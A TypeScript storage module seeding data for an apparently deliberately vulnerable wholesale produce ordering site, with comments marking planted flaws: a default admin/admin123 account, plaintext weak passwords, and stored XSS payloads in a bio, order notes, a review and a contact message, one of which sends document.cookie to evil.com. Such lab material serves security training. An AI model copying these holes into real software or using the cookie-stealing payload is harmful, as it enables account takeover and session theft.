import { 
  type User, 
  type InsertUser, 
  type Product, 
  type InsertProduct,
  type Order,
  type InsertOrder,
  type OrderItem,
  type InsertOrderItem,
  type Review,
  type InsertReview,
  type ContactSubmission,
  type InsertContact
} from "@shared/schema";
import { randomUUID } from "crypto";

export interface IStorage {
  // Users
  getUser(id: string): Promise<User | undefined>;
  getUserByUsername(username: string): Promise<User | undefined>;
  createUser(user: InsertUser): Promise<User>;
  updateUser(id: string, updates: Partial<User>): Promise<User | undefined>;
  getAllUsers(): Promise<User[]>;

  // Products
  getAllProducts(): Promise<Product[]>;
  getProduct(id: string): Promise<Product | undefined>;
  createProduct(product: InsertProduct): Promise<Product>;
  searchProducts(query: string): Promise<Product[]>;

  // Orders
  getAllOrders(): Promise<Order[]>;
  getUserOrders(userId: string): Promise<Order[]>;
  getOrder(id: string): Promise<Order | undefined>;
  createOrder(order: InsertOrder): Promise<Order>;
  updateOrderStatus(id: string, status: string): Promise<Order | undefined>;

  // Order Items
  getOrderItems(orderId: string): Promise<OrderItem[]>;
  createOrderItem(item: InsertOrderItem): Promise<OrderItem>;

  // Reviews
  getProductReviews(productId: string): Promise<Review[]>;
  createReview(review: InsertReview): Promise<Review>;

  // Contact submissions
  getAllContactSubmissions(): Promise<ContactSubmission[]>;
  createContactSubmission(contact: InsertContact): Promise<ContactSubmission>;
}

export class MemStorage implements IStorage {
  private users: Map<string, User>;
  private products: Map<string, Product>;
  private orders: Map<string, Order>;
  private orderItems: Map<string, OrderItem>;
  private reviews: Map<string, Review>;
  private contacts: Map<string, ContactSubmission>;
  private orderCounter: number = 1000;

  constructor() {
    this.users = new Map();
    this.products = new Map();
    this.orders = new Map();
    this.orderItems = new Map();
    this.reviews = new Map();
    this.contacts = new Map();
    this.seedData();
  }

  private seedData() {
    // VULNERABILITY: Default admin credentials
    const adminId = randomUUID();
    this.users.set(adminId, {
      id: adminId,
      username: "admin",
      password: "admin123", // VULNERABILITY: Plaintext password
      email: "admin@manchesterfresh.co.uk",
      companyName: "Manchester Fresh Foods",
      contactPerson: "System Administrator",
      phone: "0161 234 5678",
      address: "Unit 14, Trafford Park, Manchester M17 1DB",
      role: "admin",
      bio: null,
    });

    // Create multiple customer accounts
    const customers = [
      {
        username: "thepubco",
        password: "welcome123", // VULNERABILITY: Weak password
        email: "orders@thepubcompany.co.uk",
        companyName: "The Pub Company Ltd",
        contactPerson: "Sarah Johnson",
        phone: "0161 789 4521",
        address: "45 Deansgate, Manchester M3 2AY",
        bio: "Chain of traditional pubs across Greater Manchester serving British classics",
      },
      {
        username: "bella_italia",
        password: "pasta2024", // VULNERABILITY: Weak password
        email: "procurement@bella-italia.co.uk",
        companyName: "Bella Italia Restaurant",
        contactPerson: "Marco Rossi",
        phone: "0161 832 6574",
        address: "78 King Street, Manchester M2 4WQ",
        bio: "Authentic Italian restaurant in the heart of Manchester. Est. 2015",
      },
      {
        username: "green_leaf",
        password: "healthy1", // VULNERABILITY: Weak password
        email: "manager@greenleafcafe.com",
        companyName: "Green Leaf Café",
        contactPerson: "Emma Williams",
        phone: "0161 955 3344",
        address: "12 Oxford Road, Manchester M1 5QA",
        bio: "Vegetarian and vegan café promoting sustainable local produce",
      },
      {
        username: "royal_curry",
        password: "spice99", // VULNERABILITY: Weak password
        email: "kitchen@royalcurryhouse.co.uk",
        companyName: "Royal Curry House",
        contactPerson: "Raj Patel",
        phone: "0161 273 8899",
        address: "156 Wilmslow Road, Manchester M14 5LH",
        bio: "Award-winning Indian restaurant specialising in authentic curries. VULNERABILITY: <script>alert('xss')</script>", // VULNERABILITY: XSS in bio
      },
      {
        username: "cityhotel",
        password: "hotel2024", // VULNERABILITY: Weak password
        email: "catering@manchestercityhotel.com",
        companyName: "Manchester City Hotel",
        contactPerson: "David Chen",
        phone: "0161 234 9876",
        address: "200 Portland Street, Manchester M1 3HU",
        bio: "4-star hotel with conference facilities and two restaurants",
      },
      {
        username: "testuser",
        password: "testpass123",
        email: "test@restaurant.com",
        companyName: "Test Restaurant",
        contactPerson: "John Smith",
        phone: "0161 555 0123",
        address: "123 Main St, Manchester M1 1AA",
        role: "customer",
        bio: "Popular restaurant in Manchester city centre",
      },
    ];

    const customerIds = customers.map(c => {
      const id = randomUUID();
      this.users.set(id, {
        id,
        username: c.username,
        password: c.password,
        email: c.email,
        companyName: c.companyName,
        contactPerson: c.contactPerson,
        phone: c.phone,
        address: c.address,
        role: "customer",
        bio: c.bio,
      });
      return { id, username: c.username };
    });

    // Seed products
    const vegetables = [
      { name: "Fresh Tomatoes", description: "Vine-ripened tomatoes", category: "vegetables", unit: "kg", price: "3.50", imageUrl: "", stock: 100 },
      { name: "Baby Spinach", description: "Tender baby spinach leaves", category: "vegetables", unit: "kg", price: "4.20", imageUrl: "", stock: 80 },
      { name: "Carrots", description: "Fresh organic carrots", category: "vegetables", unit: "kg", price: "2.80", imageUrl: "", stock: 150 },
      { name: "Red Bell Peppers", description: "Sweet red peppers", category: "vegetables", unit: "kg", price: "5.00", imageUrl: "", stock: 90 },
      { name: "Mixed Salad Leaves", description: "Fresh mixed lettuce", category: "vegetables", unit: "kg", price: "3.80", imageUrl: "", stock: 70 },
    ];

    const fruits = [
      { name: "Fresh Strawberries", description: "Sweet British strawberries", category: "fruits", unit: "punnet", price: "4.50", imageUrl: "", stock: 60 },
      { name: "Apples (Braeburn)", description: "Crisp eating apples", category: "fruits", unit: "kg", price: "3.20", imageUrl: "", stock: 120 },
      { name: "Bananas", description: "Ripe yellow bananas", category: "fruits", unit: "kg", price: "2.50", imageUrl: "", stock: 150 },
      { name: "Fresh Oranges", description: "Juicy Valencia oranges", category: "fruits", unit: "kg", price: "3.80", imageUrl: "", stock: 100 },
      { name: "Blueberries", description: "Fresh blueberries", category: "fruits", unit: "punnet", price: "5.20", imageUrl: "", stock: 50 },
    ];

    const herbs = [
      { name: "Fresh Basil", description: "Aromatic basil leaves", category: "herbs", unit: "bunch", price: "1.80", imageUrl: "", stock: 40 },
      { name: "Fresh Parsley", description: "Flat-leaf parsley", category: "herbs", unit: "bunch", price: "1.50", imageUrl: "", stock: 50 },
      { name: "Fresh Coriander", description: "Fresh coriander", category: "herbs", unit: "bunch", price: "1.60", imageUrl: "", stock: 45 },
    ];

    const productIds: string[] = [];
    [...vegetables, ...fruits, ...herbs].forEach(p => {
      const id = randomUUID();
      this.products.set(id, {
        id,
        name: p.name,
        description: p.description,
        category: p.category,
        unit: p.unit,
        pricePerUnit: p.price,
        imageUrl: p.imageUrl,
        stock: p.stock,
      });
      productIds.push(id);
    });

    // Create historical orders for customers
    const now = new Date();
    const daysAgo = (days: number) => new Date(now.getTime() - days * 24 * 60 * 60 * 1000);

    // The Pub Company - Regular weekly orders
    const pubOrder1 = this.createOrderSync(customerIds[0].id, [
      { productId: productIds[0], name: "Fresh Tomatoes", quantity: 15, price: "3.50" },
      { productId: productIds[4], name: "Mixed Salad Leaves", quantity: 10, price: "3.80" },
      { productId: productIds[6], name: "Apples (Braeburn)", quantity: 8, price: "3.20" },
    ], "delivered", daysAgo(14), "45 Deansgate, Manchester M3 2AY", "Weekly order - all good quality");

    const pubOrder2 = this.createOrderSync(customerIds[0].id, [
      { productId: productIds[2], name: "Carrots", quantity: 12, price: "2.80" },
      { productId: productIds[1], name: "Baby Spinach", quantity: 8, price: "4.20" },
      { productId: productIds[3], name: "Red Bell Peppers", quantity: 10, price: "5.00" },
    ], "delivered", daysAgo(7), "45 Deansgate, Manchester M3 2AY", null);

    const pubOrder3 = this.createOrderSync(customerIds[0].id, [
      { productId: productIds[0], name: "Fresh Tomatoes", quantity: 15, price: "3.50" },
      { productId: productIds[4], name: "Mixed Salad Leaves", quantity: 10, price: "3.80" },
      { productId: productIds[10], name: "Fresh Basil", quantity: 5, price: "1.80" },
    ], "confirmed", daysAgo(0), "45 Deansgate, Manchester M3 2AY", "Please deliver before 10am");

    // Bella Italia - Italian restaurant orders
    const italianOrder1 = this.createOrderSync(customerIds[1].id, [
      { productId: productIds[0], name: "Fresh Tomatoes", quantity: 25, price: "3.50" },
      { productId: productIds[10], name: "Fresh Basil", quantity: 15, price: "1.80" },
      { productId: productIds[3], name: "Red Bell Peppers", quantity: 12, price: "5.00" },
    ], "delivered", daysAgo(10), "78 King Street, Manchester M2 4WQ", "Grazie! <img src=x onerror=alert('xss')>"); // VULNERABILITY: XSS in order notes

    const italianOrder2 = this.createOrderSync(customerIds[1].id, [
      { productId: productIds[1], name: "Baby Spinach", quantity: 10, price: "4.20" },
      { productId: productIds[11], name: "Fresh Parsley", quantity: 8, price: "1.50" },
      { productId: productIds[8], name: "Fresh Oranges", quantity: 15, price: "3.80" },
    ], "confirmed", daysAgo(2), "78 King Street, Manchester M2 4WQ", null);

    // Green Leaf Café - Organic produce
    const cafeOrder1 = this.createOrderSync(customerIds[2].id, [
      { productId: productIds[1], name: "Baby Spinach", quantity: 20, price: "4.20" },
      { productId: productIds[4], name: "Mixed Salad Leaves", quantity: 15, price: "3.80" },
      { productId: productIds[5], name: "Fresh Strawberries", quantity: 12, price: "4.50" },
      { productId: productIds[9], name: "Blueberries", quantity: 10, price: "5.20" },
    ], "delivered", daysAgo(5), "12 Oxford Road, Manchester M1 5QA", "All organic please");

    const cafeOrder2 = this.createOrderSync(customerIds[2].id, [
      { productId: productIds[2], name: "Carrots", quantity: 8, price: "2.80" },
      { productId: productIds[6], name: "Apples (Braeburn)", quantity: 10, price: "3.20" },
      { productId: productIds[7], name: "Bananas", quantity: 15, price: "2.50" },
    ], "pending", daysAgo(1), "12 Oxford Road, Manchester M1 5QA", "Urgent - event tomorrow");

    // Royal Curry House - Herbs and vegetables
    const curryOrder1 = this.createOrderSync(customerIds[3].id, [
      { productId: productIds[0], name: "Fresh Tomatoes", quantity: 18, price: "3.50" },
      { productId: productIds[12], name: "Fresh Coriander", quantity: 20, price: "1.60" },
      { productId: productIds[3], name: "Red Bell Peppers", quantity: 15, price: "5.00" },
    ], "delivered", daysAgo(12), "156 Wilmslow Road, Manchester M14 5LH", null);

    const curryOrder2 = this.createOrderSync(customerIds[3].id, [
      { productId: productIds[2], name: "Carrots", quantity: 10, price: "2.80" },
      { productId: productIds[1], name: "Baby Spinach", quantity: 12, price: "4.20" },
      { productId: productIds[12], name: "Fresh Coriander", quantity: 15, price: "1.60" },
    ], "confirmed", daysAgo(3), "156 Wilmslow Road, Manchester M14 5LH", "Please ring doorbell");

    // City Hotel - Large orders
    const hotelOrder1 = this.createOrderSync(customerIds[4].id, [
      { productId: productIds[0], name: "Fresh Tomatoes", quantity: 30, price: "3.50" },
      { productId: productIds[4], name: "Mixed Salad Leaves", quantity: 25, price: "3.80" },
      { productId: productIds[5], name: "Fresh Strawberries", quantity: 20, price: "4.50" },
      { productId: productIds[6], name: "Apples (Braeburn)", quantity: 20, price: "3.20" },
      { productId: productIds[8], name: "Fresh Oranges", quantity: 25, price: "3.80" },
    ], "delivered", daysAgo(8), "200 Portland Street, Manchester M1 3HU", "Conference this weekend - large order");

    const hotelOrder2 = this.createOrderSync(customerIds[4].id, [
      { productId: productIds[1], name: "Baby Spinach", quantity: 15, price: "4.20" },
      { productId: productIds[3], name: "Red Bell Peppers", quantity: 18, price: "5.00" },
      { productId: productIds[7], name: "Bananas", quantity: 30, price: "2.50" },
    ], "pending", daysAgo(0), "200 Portland Street, Manchester M1 3HU", null);

    // Add some product reviews
    this.reviews.set(randomUUID(), {
      id: randomUUID(),
      productId: productIds[0], // Fresh Tomatoes
      userId: customerIds[0].id,
      rating: 5,
      comment: "Excellent quality tomatoes, always fresh and vine-ripened. Our customers love them!",
      createdAt: daysAgo(15),
    });

    this.reviews.set(randomUUID(), {
      id: randomUUID(),
      productId: productIds[10], // Fresh Basil
      userId: customerIds[1].id,
      rating: 5,
      comment: "Perfetto! The basil is always aromatic and fresh. Essential for our pasta dishes.",
      createdAt: daysAgo(11),
    });

    this.reviews.set(randomUUID(), {
      id: randomUUID(),
      productId: productIds[1], // Baby Spinach
      userId: customerIds[2].id,
      rating: 4,
      comment: "Good quality organic spinach. Would prefer slightly larger bags though.",
      createdAt: daysAgo(6),
    });

    this.reviews.set(randomUUID(), {
      id: randomUUID(),
      productId: productIds[12], // Fresh Coriander
      userId: customerIds[3].id,
      rating: 5,
      comment: "Fresh coriander essential for authentic curries. Always top quality! <script>alert('review-xss')</script>", // VULNERABILITY: XSS in review
      createdAt: daysAgo(13),
    });

    // Add some contact form submissions
    this.contacts.set(randomUUID(), {
      id: randomUUID(),
      name: "Tom Baker",
      email: "tom@newcafe.co.uk",
      company: "The New Café",
      message: "Hi, I'm opening a new café in Didsbury and would like to discuss wholesale pricing for fruit and vegetables. Could someone contact me?",
      createdAt: daysAgo(4),
    });

    this.contacts.set(randomUUID(), {
      id: randomUUID(),
      name: "Lisa Morton",
      email: "lisa.morton@catering.com",
      company: "Morton Events",
      message: "We run corporate catering events and need a reliable supplier for fresh produce. Do you offer next-day delivery? <img src=x onerror=fetch('http://evil.com/?cookie='+document.cookie)>", // VULNERABILITY: XSS in contact form
      createdAt: daysAgo(2),
    });

    this.contacts.set(randomUUID(), {
      id: randomUUID(),
      name: "James Wilson",
      email: "james@wilsonrestaurants.co.uk",
      company: null,
      message: "Question about your organic certification. Do you have documentation I can review?",
      createdAt: daysAgo(6),
    });
  }

  private createOrderSync(
    userId: string,
    items: Array<{ productId: string; name: string; quantity: number; price: string }>,
    status: string,
    createdAt: Date,
    deliveryAddress: string,
    notes: string | null
  ): string {
    const orderId = randomUUID();
    const orderNumber = `MFF-${this.orderCounter++}`;
    const totalAmount = items.reduce((sum, item) => 
      sum + (parseFloat(item.price) * item.quantity), 0
    ).toFixed(2);

    this.orders.set(orderId, {
      id: orderId,
      orderNumber,
      userId,
      status,
      totalAmount,
      deliveryDate: status === "pending" ? null : createdAt,
      deliveryAddress,
      notes,
      createdAt,
    });

    items.forEach(item => {
      const itemId = randomUUID();
      const subtotal = (parseFloat(item.price) * item.quantity).toFixed(2);
      this.orderItems.set(itemId, {
        id: itemId,
        orderId,
        productId: item.productId,
        productName: item.name,
        quantity: item.quantity,
        unitPrice: item.price,
        subtotal,
      });
    });

    return orderId;
  }

  // Users
  async getUser(id: string): Promise<User | undefined> {
    return this.users.get(id);
  }

  async getUserByUsername(username: string): Promise<User | undefined> {
    return Array.from(this.users.values()).find(
      (user) => user.username === username,
    );
  }

  async createUser(insertUser: InsertUser): Promise<User> {
    const id = randomUUID();
    const user: User = { 
      ...insertUser, 
      id,
      role: "customer",
      companyName: insertUser.companyName || null,
      contactPerson: insertUser.contactPerson || null,
      phone: insertUser.phone || null,
      address: insertUser.address || null,
      bio: insertUser.bio || null,
    };
    this.users.set(id, user);
    return user;
  }

  async updateUser(id: string, updates: Partial<User>): Promise<User | undefined> {
    const user = this.users.get(id);
    if (!user) return undefined;
    const updated = { ...user, ...updates };
    this.users.set(id, updated);
    return updated;
  }

  async getAllUsers(): Promise<User[]> {
    return Array.from(this.users.values());
  }

  // Products
  async getAllProducts(): Promise<Product[]> {
    return Array.from(this.products.values());
  }

  async getProduct(id: string): Promise<Product | undefined> {
    return this.products.get(id);
  }

  async createProduct(insertProduct: InsertProduct): Promise<Product> {
    const id = randomUUID();
    const product: Product = { ...insertProduct, id };
    this.products.set(id, product);
    return product;
  }

  async searchProducts(query: string): Promise<Product[]> {
    const lowerQuery = query.toLowerCase();
    return Array.from(this.products.values()).filter(p =>
      p.name.toLowerCase().includes(lowerQuery) ||
      p.category.toLowerCase().includes(lowerQuery)
    );
  }

  // Orders
  async getAllOrders(): Promise<Order[]> {
    return Array.from(this.orders.values());
  }

  async getUserOrders(userId: string): Promise<Order[]> {
    return Array.from(this.orders.values()).filter(o => o.userId === userId);
  }

  async getOrder(id: string): Promise<Order | undefined> {
    return this.orders.get(id);
  }

  async createOrder(insertOrder: InsertOrder): Promise<Order> {
    const id = randomUUID();
    const orderNumber = `MFF-${this.orderCounter++}`;
    const order: Order = {
      id,
      orderNumber,
      userId: insertOrder.userId,
      status: insertOrder.status || "pending",
      totalAmount: insertOrder.totalAmount,
      deliveryDate: insertOrder.deliveryDate || null,
      deliveryAddress: insertOrder.deliveryAddress || null,
      notes: insertOrder.notes || null,
      createdAt: new Date(),
    };
    this.orders.set(id, order);
    return order;
  }

  async updateOrderStatus(id: string, status: string): Promise<Order | undefined> {
    const order = this.orders.get(id);
    if (!order) return undefined;
    order.status = status;
    this.orders.set(id, order);
    return order;
  }

  // Order Items
  async getOrderItems(orderId: string): Promise<OrderItem[]> {
    return Array.from(this.orderItems.values()).filter(item => item.orderId === orderId);
  }

  async createOrderItem(insertItem: InsertOrderItem): Promise<OrderItem> {
    const id = randomUUID();
    const item: OrderItem = { ...insertItem, id };
    this.orderItems.set(id, item);
    return item;
  }

  // Reviews
  async getProductReviews(productId: string): Promise<Review[]> {
    return Array.from(this.reviews.values()).filter(r => r.productId === productId);
  }

  async createReview(insertReview: InsertReview): Promise<Review> {
    const id = randomUUID();
    const review: Review = {
      ...insertReview,
      id,
      createdAt: new Date(),
    };
    this.reviews.set(id, review);
    return review;
  }

  // Contact submissions
  async getAllContactSubmissions(): Promise<ContactSubmission[]> {
    return Array.from(this.contacts.values());
  }

  async createContactSubmission(insertContact: InsertContact): Promise<ContactSubmission> {
    const id = randomUUID();
    const contact: ContactSubmission = {
      ...insertContact,
      id,
      company: insertContact.company || null,
      createdAt: new Date(),
    };
    this.contacts.set(id, contact);
    return contact;
  }
}

export const storage = new MemStorage();
